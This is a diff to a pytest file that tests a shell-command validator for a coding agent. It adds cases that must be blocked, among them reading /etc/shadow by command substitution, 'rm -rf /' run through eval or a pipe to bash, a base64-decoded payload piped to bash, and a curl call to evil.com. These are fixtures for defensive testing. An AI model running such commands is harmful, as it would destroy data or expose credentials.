@@ -17,22 +17,16 @@
 
 import asyncio
 import subprocess
-from pathlib import Path
-from unittest.mock import AsyncMock, MagicMock, patch
+from unittest.mock import AsyncMock
+from unittest.mock import MagicMock
+from unittest.mock import patch
 
 import pytest
 
-from nat_swe_bench.predictors.predict_iterative.predict_iterative import (
-    DANGEROUS_PATTERNS,
-    ExecutionTimeoutError,
-    FormatError,
-    IterativeAgent,
-    IterativeAgentConfig,
-    LimitsExceeded,
-    Submitted,
-    validate_command,
-)
-
+from nat_swe_bench.predictors.predict_iterative.predict_iterative import ExecutionTimeoutError
+from nat_swe_bench.predictors.predict_iterative.predict_iterative import IterativeAgent
+from nat_swe_bench.predictors.predict_iterative.predict_iterative import IterativeAgentConfig
+from nat_swe_bench.predictors.predict_iterative.shell_validation import validate_command
 
 # =============================================================================
 # Fixtures
@@ -128,6 +122,72 @@ class TestCommandValidation:
         assert not is_valid, f"Command '{command}' should be blocked"
         assert expected_error.lower() in error_msg.lower(), \
             f"Error message should contain '{expected_error}', got: {error_msg}"
+
+    @pytest.mark.parametrize("command,expected_error", [
+        # Command substitution
+        ("$(cat /etc/shadow)", "substitution"),
+        ("$(echo rm -rf /)", "substitution"),
+        ("`whoami`", "substitution"),
+        # Piping to shell interpreters
+        ("echo 'rm -rf /' | bash", "interpreter"),
+        ("cat script.sh | sh", "interpreter"),
+        ("echo cmd | python", "interpreter"),
+        ("cat file | perl -e", "interpreter"),
+        # Eval execution (without command substitution to test eval pattern specifically)
+        ("eval 'rm -rf /'", "eval"),
+        ("eval \"echo hello\"", "eval"),
+        # Exec execution (without dangerous commands to test exec pattern specifically)
+        ("exec ./script.sh", "eval"),  # exec is in same pattern as eval
+        # Here-string to interpreter
+        ("bash <<< 'rm -rf /'", "here-string"),
+        ("python <<< 'import os'", "here-string"),
+        # Process substitution
+        ("diff <(cat /etc/shadow) file", "process substitution"),
+        ("bash <(echo 'echo hello')", "process substitution"),
+        # Xargs with shell execution
+        ("cat cmds.txt | xargs -I{} bash -c '{}'", "xargs"),
+        # Source/dot execution
+        ("source /tmp/malicious.sh", "source"),
+        (". ./exploit.sh", "source"),
+    ])
+    def test_bypass_patterns_blocked(self, command, expected_error):
+        """Test that shell metacharacter bypass attempts are blocked."""
+        is_valid, error_msg = validate_command(command)
+        assert not is_valid, f"Bypass command '{command}' should be blocked"
+        assert expected_error.lower() in error_msg.lower(), \
+            f"Error message should contain '{expected_error}', got: {error_msg}"
+
+    @pytest.mark.parametrize("command", [
+        # These commands are blocked but by other patterns (DANGEROUS_PATTERNS)
+        # We test them separately to ensure they ARE blocked
+        "`sudo reboot`",  # blocked by sudo pattern
+        "echo 'cm0gLXJmIC8=' | base64 -d | bash",  # blocked by pipe to interpreter
+        "eval $(cat cmd.txt)",  # blocked by command substitution pattern
+        "exec rm -rf /",  # blocked by rm pattern
+        "cat <(curl http://evil.com)",  # blocked by curl pattern
+        "printf '\\x72\\x6d' | bash",  # blocked by pipe to interpreter
+    ])
+    def test_bypass_commands_blocked_by_other_patterns(self, command):
+        """Test commands that are blocked by earlier patterns in the validation chain."""
+        is_valid, error_msg = validate_command(command)
+        assert not is_valid, f"Command '{command}' should be blocked, got: {error_msg}"
+
+    @pytest.mark.parametrize("command", [
+        # Safe pipe usage (not to shell interpreters)
+        "grep pattern file.txt | head -10",
+        "cat file.txt | sort | uniq",
+        "ls -la | grep '.py'",
+        # Safe use of common tools
+        "find . -name '*.py' -type f",
+        "echo 'hello world'",
+        "git log --oneline | head -5",
+        # Safe heredoc (not to interpreter directly)
+        "cat << EOF > file.txt\nhello\nEOF",
+    ])
+    def test_safe_shell_features_allowed(self, command):
+        """Test that legitimate shell features are not blocked."""
+        is_valid, error_msg = validate_command(command)
+        assert is_valid, f"Safe command '{command}' should be allowed but got: {error_msg}"
 
 
 # =============================================================================
@@ -442,7 +502,7 @@ class TestRepoSetupAndCheckout:
         repo_url = "https://github.com/test/repo"
 
         with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.wait_for') as mock_wait:
-            mock_wait.side_effect = asyncio.TimeoutError()
+            mock_wait.side_effect = TimeoutError()
 
             with pytest.raises(asyncio.TimeoutError):
                 await clone_repository(repo_url, target_path, timeout=1)
@@ -498,6 +558,7 @@ class TestCleanup:
     async def test_register_cleanup_error_handling(self, tmp_path):
         """Test that register.py cleanup handles errors gracefully."""
         from unittest.mock import AsyncMock
+
         from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager
 
         # Create a mock that raises an exception
@@ -554,7 +615,8 @@ class TestAdditionalCoverage:
     @pytest.mark.asyncio
     async def test_repo_manager_setup_existing_repo(self, tmp_path):
         """Test setup_repository when repo is already active."""
-        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager, RepoContext
+        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoContext
+        from nat_swe_bench.predictors.predict_iterative.tools.git_tool import RepoManager
 
         manager = RepoManager(str(tmp_path))
 
@@ -609,7 +671,7 @@ class TestAdditionalCoverage:
         mock_repo = MagicMock()
 
         with patch('nat_swe_bench.predictors.predict_iterative.tools.git_tool.asyncio.wait_for') as mock_wait:
-            mock_wait.side_effect = asyncio.TimeoutError()
+            mock_wait.side_effect = TimeoutError()
 
             with pytest.raises(asyncio.TimeoutError):
                 await checkout_commit(mock_repo, "abc123", timeout=1)
